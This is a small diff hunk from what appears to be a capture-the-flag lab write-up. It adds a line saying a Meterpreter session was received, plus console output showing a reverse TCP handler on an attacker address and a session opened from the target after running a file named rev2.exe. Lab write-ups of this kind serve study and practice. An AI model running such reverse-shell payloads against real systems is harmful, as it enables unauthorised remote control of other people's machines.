@@ -231,7 +231,8 @@ d----         6/10/2018   3:44 PM            vmware-SYSTEM
 
 .\rev2.exe
 ```
-
+I get the session in the meterpreter handler.
+```bash
 [*] Started reverse TCP handler on 10.10.14.162:9998 
 [*] Meterpreter session 1 opened (10.10.14.162:9998 -> 10.129.65.179:49184) at 2020-12-20 13:20:00 +0000
 
